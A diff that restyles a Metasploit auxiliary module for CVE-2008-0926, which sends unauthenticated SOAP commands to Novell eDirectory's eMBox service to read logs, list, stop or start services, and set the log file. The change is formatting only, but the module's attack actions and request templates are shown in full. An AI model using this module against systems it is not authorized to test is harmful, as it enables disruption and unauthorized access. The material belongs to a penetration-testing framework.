@@ -8,104 +8,104 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Novell eDirectory eMBox Unauthenticated File Access',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Novell eDirectory eMBox Unauthenticated File Access',
+        'Description' => %q{
           This module will access Novell eDirectory's eMBox service and can run the
-        following actions via the SOAP interface: GET_DN, READ_LOGS, LIST_SERVICES,
-        STOP_SERVICE, START_SERVICE, SET_LOGFILE.
-      },
-      'References'     =>
-        [
+          following actions via the SOAP interface: GET_DN, READ_LOGS, LIST_SERVICES,
+          STOP_SERVICE, START_SERVICE, SET_LOGFILE.
+        },
+        'References' => [
           [ 'CVE', '2008-0926' ],
           [ 'BID', '28441' ],
           [ 'OSVDB', '43690' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Nicob',
-          'MC',    #Initial Metasploit module
+          'MC',    # Initial Metasploit module
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'Actions'        =>
-        [
+        'License' => MSF_LICENSE,
+        'Actions' => [
           [
             'GET_DN',
             {
               'Description' => 'Get DN',
-              'CMD'         => 'novell.embox.connmgr.serverinfo',
-              'PATTERN'     => /<ServerDN dt="Binary">(.*)<\/ServerDN>/,
-              'USE_PARAM'   => false
+              'CMD' => 'novell.embox.connmgr.serverinfo',
+              'PATTERN' => /<ServerDN dt="Binary">(.*)<\/ServerDN>/,
+              'USE_PARAM' => false
             }
           ],
           [
             'READ_LOGS',
             {
               'Description' => 'Read all the log files',
-              'CMD'         => 'logger.readlog',
-              'PATTERN'     => /<LogFileData>(.*)<\/LogFileData>/,
-              'USE_PARAM'   => false
+              'CMD' => 'logger.readlog',
+              'PATTERN' => /<LogFileData>(.*)<\/LogFileData>/,
+              'USE_PARAM' => false
             }
           ],
           [
             'LIST_SERVICES',
             {
               'Description' => 'List services',
-              'CMD'         => 'novell.embox.service.getServiceList',
-              'PATTERN'     => /<DSService:Message dt=\"Binary\">(.*)<\/DSService:Message>/,
-              'USE_PARAM'   => false
+              'CMD' => 'novell.embox.service.getServiceList',
+              'PATTERN' => /<DSService:Message dt=\"Binary\">(.*)<\/DSService:Message>/,
+              'USE_PARAM' => false
             }
           ],
           [
             'STOP_SERVICE',
             {
               'Description' => 'Stop a service',
-              'CMD'         => 'novell.embox.service.stopService',
-              'PATTERN'     => /<DSService:Message dt="Binary">(.*)<\/DSService:Message>/,
-              'PARAM'       => '<Parameters><params xmlns:DSService="service.dtd">'+
-                               '<DSService:moduleName>__PARAM__</DSService:moduleName>'+
+              'CMD' => 'novell.embox.service.stopService',
+              'PATTERN' => /<DSService:Message dt="Binary">(.*)<\/DSService:Message>/,
+              'PARAM' => '<Parameters><params xmlns:DSService="service.dtd">' +
+                               '<DSService:moduleName>__PARAM__</DSService:moduleName>' +
                                '</params></Parameters>',
-              'USE_PARAM'   => true
+              'USE_PARAM' => true
             }
           ],
           [
             'START_SERVICE',
             {
               'Description' => 'Start a service',
-              'CMD'         => 'novell.embox.service.startService',
-              'PATTERN'     => /<DSService:Message dt="Binary">(.*)<\/DSService:Message>/,
-              'PARAM'       => '<Parameters>' +
+              'CMD' => 'novell.embox.service.startService',
+              'PATTERN' => /<DSService:Message dt="Binary">(.*)<\/DSService:Message>/,
+              'PARAM' => '<Parameters>' +
                                '<params xmlns:DSService="service.dtd">' +
-                               '<DSService:moduleName>__PARAM__</DSService:moduleName>'+
+                               '<DSService:moduleName>__PARAM__</DSService:moduleName>' +
                                '</params></Parameters>',
-              'USE_PARAM'   => true
+              'USE_PARAM' => true
             }
           ],
           [
             'SET_LOGFILE',
             {
               'Description' => 'Read Log File',
-              'CMD'         => 'logger.setloginfo',
-              'PATTERN'     => /<Logger:Message dt="Binary">(.*)<\/Logger:Message>/,
-              'PARAM'       => '<Parameters><params><logFile>__PARAM__</logFile>'+
+              'CMD' => 'logger.setloginfo',
+              'PATTERN' => /<Logger:Message dt="Binary">(.*)<\/Logger:Message>/,
+              'PARAM' => '<Parameters><params><logFile>__PARAM__</logFile>' +
                                '<logOptionAppend/></params></Parameters>',
-              'USE_PARAM'   => true
+              'USE_PARAM' => true
             }
           ]
         ],
-      'DefaultAction'  => 'LIST_SERVICES'
-    ))
+        'DefaultAction' => 'LIST_SERVICES'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8028),
         OptString.new("PARAM", [false, 'Specify a parameter for the action'])
-      ])
+      ]
+    )
   end
 
   def run
-
     if action.opts['USE_PARAM']
       if datastore['PARAM'].nil? or datastore['PARAM'].empty?
         print_error("You must supply a parameter for action: #{action.name}")
@@ -133,10 +133,10 @@ class MetasploitModule < Msf::Auxiliary
     connect
     print_status("Sending command: #{action.name}...")
     res = send_request_cgi({
-      'method'   => 'POST',
-      'uri'      => '/SOAP',
-      'data'     => template + "\n\n",
-      'headers'  =>
+      'method' => 'POST',
+      'uri' => '/SOAP',
+      'data' => template + "\n\n",
+      'headers' =>
         {
           'Content-Type' => 'text/xml',
           'SOAPAction' => "\"" + Rex::Text.rand_text_alpha_upper(rand(25) + 1) + "\"",
